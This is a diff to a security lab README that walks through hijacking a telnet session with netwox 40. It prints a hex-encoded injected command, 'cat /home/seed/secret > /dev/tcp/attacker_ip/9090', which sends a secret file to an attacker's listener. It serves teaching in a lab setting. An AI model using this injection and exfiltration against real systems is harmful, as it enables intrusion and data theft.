@@ -2,7 +2,7 @@
 
 ### Requirements 
 
-In this lab, we will hijack a telnet session (between the victim client and the victim server) and inject a malicious command.
+In this lab, we will hijack a telnet session (between the victim client and the victim server) and inject a malicious command. In particular, the attacker wants to see the content of a secret file (stored on the server). At the end of this lab, if the attack is successful, the content of this secret file will be displayed in the attacker's terminal window.
 
 ### Setup
 
@@ -34,7 +34,7 @@ In this lab, we will hijack a telnet session (between the victim client and the 
 
 6. the above packet provides the information which the attacker needs to know in order to perform the tcp session hijacking attack. now, the attacker, mimicking the **client**, needs to use the *netwox 40* command to inject a telnet command. The command should be in this format: # sudo netwox 40 --ip4-src *source_ip* --ip4-dst *destination_ip* --tcp-src *source_port* --tcp-dst *destination_port* --tcp-seqnum *sequence_number* --ip4-ttl *ttl_value* --tcp-window *window_size* --tcp-ack --tcp-acknum *acknowledgment_number* --tcp-data "putyourdatahere,in hex format". Remember to replace these italic texts with information captured in wireshark. To run the command, the attacker opens a terminal window, types the *netwox 40* command, and press enter.
 
-**Note**: because the attacker is mimicking the client, thus the source ip address needs to be the client's IP address; from the captured latest packet, we can see the sequence number is *2523450797*, the acknowledgment number is *311613137*; the source port (in this example) is 57502, the destination port is 23. the tcp window size (in this example) is 245, the time to live (ttl) value is 64. The tcp data we can use is: 0d20636174202f686f6d652f736565642f736563726574203e202f6465762f7463702f61747461636b65725f69702f39303930200d.
+**Note**: because the attacker is mimicking the client, thus the source ip address needs to be the client's IP address; from the captured latest packet, we can see the sequence number is *2523450797*, the acknowledgment number is *311613137*; the source port (in this example) is 57502, the destination port is 23. the tcp window size (in this example) is 245, the time to live (ttl) value is 64. The tcp data we can use is: "0d20636174202f686f6d652f736565642f736563726574203e202f6465762f7463702f61747461636b65725f69702f39303930200d".
 
 **Explanation**: why the tcp data is "0d20636174202f686f6d652f736565642f736563726574203e202f6465762f7463702f61747461636b65725f69702f39303930200d"? Because the telnet command we want to inject is: "cat /home/seed/secret > /dev/tcp/attacker_ip/9090", and we want this command to be sandwiched by two newline signs "\r", so that the command will not be concatenated with other random strings. assume the atacker's IP address is 172.16.77.130, then this is how we can convert this whole thing into hex:
 
@@ -42,6 +42,8 @@ In this lab, we will hijack a telnet session (between the victim client and the 
 
 Thus in this example, the netwox 40 command we are going to type is:
 ![alt text](lab-tcp-hijack-command.png "Lab tcp hijack - the netwox command")
+
+**Explanation 2**: why the telnet command we want to inject is "cat /home/seed/secret > /dev/tcp/attacker_ip/9090". Because "cat /home/seed/secret" shows the content of the secret file, but this command will only display the content in the victim client's terminal window, not in the attacker's terminal window. This "cat /home/seed/secret > /dev/tcp/attacker_ip/9090" will redirect the output of the cat command into a tcp port 9090 at the attacker's ip address. Thus we come to our next step,
 
 7. before pressing enter, the attacker needs to open another terminal window so that the attacker can listen on a port - we will choose port 9090.
 
